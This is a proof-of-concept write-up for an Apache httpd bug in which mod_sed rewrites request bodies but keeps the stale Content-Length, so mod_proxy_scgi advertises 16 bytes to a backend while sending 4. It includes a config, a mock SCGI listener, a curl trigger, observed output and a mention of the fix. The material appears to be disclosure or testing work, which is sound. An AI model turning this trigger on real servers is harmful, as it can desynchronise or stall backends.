# PoC 116 — Request Body Length Desynchronization

`InputSed` rewrites request body bytes but leaves the original
`Content-Length` in `r->headers_in`, so downstream handlers (e.g.
`mod_proxy_scgi`) advertise the *pre-filter* length while sending
*post-filter* bytes.

## Setup

`mod_sed`, `mod_proxy`, `mod_proxy_scgi`. A mock SCGI backend records the
declared `CONTENT_LENGTH` and the bytes that actually arrive.

`httpd.conf`:

```apache
ServerName 127.0.0.1
Listen 8080
LoadModule mpm_prefork_module    modules/mod_mpm_prefork.so
LoadModule authz_core_module     modules/mod_authz_core.so
LoadModule sed_module            modules/mod_sed.so
LoadModule proxy_module          modules/mod_proxy.so
LoadModule proxy_scgi_module     modules/mod_proxy_scgi.so
LoadModule unixd_module          modules/mod_unixd.so

<Location /s/>
    SetInputFilter Sed
    InputSed "s/AAAA/B/g"
    ProxyPass scgi://127.0.0.1:9000/
</Location>
```

Mock SCGI listener `/tmp/scgi_stub.py`:

```python
import socket, sys
s = socket.socket(); s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
s.bind(("127.0.0.1", 9000)); s.listen(1)
print("scgi listening")
c, _ = s.accept()
buf = b""
while b":" not in buf:
    buf += c.recv(4096)
hlen, _, rest = buf.partition(b":")
hlen = int(hlen)
while len(rest) < hlen + 1:
    rest += c.recv(4096)
hdrs, body = rest[:hlen], rest[hlen+1:]
fields = dict(zip(hdrs.split(b"\x00")[::2], hdrs.split(b"\x00")[1::2]))
print("CONTENT_LENGTH advertised:", fields.get(b"CONTENT_LENGTH"))
# Drain whatever bytes the proxy is willing to send.
c.settimeout(2)
try:
    while True:
        chunk = c.recv(4096)
        if not chunk: break
        body += chunk
except socket.timeout:
    pass
print("body bytes received:", len(body), "first 80:", body[:80])
c.send(b"Status: 200 OK\r\nContent-Type: text/plain\r\n\r\nok\n")
c.close()
```

## Trigger

```bash
python3 /tmp/scgi_stub.py &
httpd -X -f /tmp/httpd.conf &
sleep 1
# 16 bytes of "AAAA" => 4 occurrences, sed rewrites each to "B" => 4 bytes.
python3 -c 'import sys; sys.stdout.buffer.write(b"AAAA"*4)' \
  | curl -sv --data-binary @- \
        -H 'Content-Type: application/octet-stream' \
        http://127.0.0.1:8080/s/
```

## Observed effect

The SCGI stub prints something like:

```text
CONTENT_LENGTH advertised: b'16'
body bytes received: 4 first 80: b'BBBB'
```

The backend is told the body is 16 bytes long but only 4 bytes are sent
(or, depending on framing, it blocks waiting for 12 bytes that will never
arrive). With the patch (`apr_table_unset(... "Content-Length")`) the
backend is correctly told the length is unknown and reads to EOF, e.g.:

```text
CONTENT_LENGTH advertised: None     # or recomputed by the backend
body bytes received: 4 first 80: b'BBBB'
```

## Marker

A mismatch between the `CONTENT_LENGTH` SCGI header and the number of body
bytes actually delivered, captured by the mock backend.
